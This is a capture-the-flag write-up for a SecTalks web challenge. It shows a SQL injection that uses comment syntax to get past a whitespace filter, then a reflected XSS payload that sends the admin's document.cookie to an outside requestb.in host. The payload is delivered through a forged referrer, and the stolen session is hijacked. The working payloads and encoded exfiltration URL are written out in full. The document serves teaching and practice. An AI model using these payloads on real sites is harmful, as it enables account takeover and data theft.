#SYD0x10 CTF Writeups#
##### By [SteffnJ](https://github.com/SteffnJ) #####

## Introduction ##
You are given a website: http://188.166.235.114/ and a hint that there are two main flags.

## Flag 1 ##
After playing around with various aspects such as checking source-code, cookies, parameters, etc, we realized that the search box seems vulnerable. This is verified by typing `'` as a search string. This gives the error: `Error in query: SELECT * FROM posts WHERE public = 1 AND content LIKE '%'%'`. Now that we have found something that seems vulnerable to a SQL injection, we need to find out exactly how it works and how we can exploit it. After playing around a bit more with a string such as `'hello world`, we can clearly see this: `Error in query: SELECT * FROM posts WHERE public = 1 AND content LIKE '%'hello%'`. Interesting! It seems that whitespaces is used as a delimiter and ignores everything after the first whitespace. 

<br>

Since `' or 1=1;--` does not seem to work (the latter semicolon and double hyphens are to comment out the rest of the field and therefore escaping the `%` wildcard used), we will have to find other ways. Perhaps we can use multiline comments? After trying with `'/**/or/**/1=1;--` we achieve success! The flag shows up as a blog entry on the result page (along with all other blog entries):
######flag{bb020edd4cb6f01132259bbb761ca2d5}######

<br><br>

## Flag 2 ##

This one was a bit worse. Again, playing around some more. We came across the *report a page* functionality. This gave you a textbox and a submit button (also hardcoded the page you were visiting from). After trying to type in something as `hello world` and submitting, the message comes up on the next page along with a message saying that someone will look at it shortly. Hmm. Interesting. Perhaps an XSS vulnerability?

<br>

After trying to type in `<script>alert('Hello Admin');</script>` in the message box and submitting, we can see that the whole thing has been rendered as text and not as a script. But wait! It seems that we are submitting the URL we were visiting from as well as a message. Perhaps both will be checked? We started playing around with the search box again. Trying `'<script>alert('Hello admin');</admin>` (note the single quote!) in the search bar seems to give us an alert box rendered on top of the SQL query. We have found an XSS vulnerability!  Perhaps we can steal their cookie?

<br>

Now that we have a vulnerability we can exploit for a phishing attempt, we will have to design our actual exploit. As I have never done this before, I started reading up on XSS attacks and found a way to automatically redirect people: `<script>window.location="urlhere"";</script>`. How can we use this as an attack? Let us redirect them to a server of our choosing and append their cookie as a request parameter - beautiful. Let us create a [requestb.in](http://requestb.in): [http://requestb.in/100a9qp1](http://requestb.in/100a9qp1). This creates a dashboard at [http://requestb.in/100a9qp1?inspect](http://requestb.in/100a9qp1?inspect). Note that you will have to create your own requestbin when this expires.

<br>

Let us try to steal our own cookie (you can set a cookie yourself to verify that it works: in Firefox, open Developer Toolbar (Shift+F2) and type in `cookie set horse 1` - this creates a cookie `horse` with the value `1` for this domain/IP. Using same logic as above, let us try `'<script>window.location="http://requestb.in/100a9qp1?cookie="/**/+/**/document.cookie;</script>` in the search bar. This gets an error at first, before it redirects us to a page saying "ok". By refreshing the requestb.in dashboard, we can see that the cookie shows up. It works!

<br>

How can we deliver it? Let us go back and do this again, to ourselves `'<script>window.location="http://requestb.in/100a9qp1?cookie="/**/+/**/document.cookie;</script>` in the search bar. As soon as we get the sql query error, we can stop the loading and grab the url. It would be something like: `http://188.166.235.114/search?q=%27%3Cscript%3Ewindow.location%3D%22http%3A%2F%2Frequestb.in%2F100a9qp1%3Fcookie%3D%22%2F**%2F%2B%2F**%2Fdocument.cookie%3B%3C%2Fscript%3E`. This is what we will give to the admin - so we can sniff their cookie from the requestb.in. Since it seems like they are using the HTTP referrer on the 'report a page' site, we can modify our HTTP referrer with a plugin such as 'refcontrol'. Then we just say that for all pages with IP `188.166.235.114` we will use this referrer (`http://188.166.235.114/search?q=%27%3Cscript%3Ewindow.location%3D%22http%3A%2F%2Frequestb.in%2F100a9qp1%3Fcookie%3D%22%2F**%2F%2B%2F**%2Fdocument.cookie%3B%3C%2Fscript%3E`). Let us go back to the report page and submit a report - one can clearly see that the url is not where we came from, but instead what we crafted. We typed in a message to the admin `Dear admin, how secure..` and submitted the report. A few seconds later the cookie pops up on the requestb.in. We load it into our browser.

<br>

Last part of the puzzle, finding the flag. After we loaded the cookie into our browser and refreshed the page, we got a 'log out' button visible - implying we are logged in. We went to the 'exploits' page which did not seem to be open unless logged in, and there was the flag:
######flag{ec0895237c0f2be72260714214372e43}######

---


Fun-fact: I was told about [requestb.in](http://requestb.in) after I had gotten all the flags. I actually wrote my own cookie-sniffing server in flask and hosted at my Raspberry Pi from home. Could have saved me a lot of time. Hehe.

<br>

---
Thanks to the SecTalks crew for organizing and Glen for creating the challenge (and presenting previous month's CTF solution). Lastly, a thank goes out to everyday_behaviours and gibs for being awesome team-members and getting through these challenges!
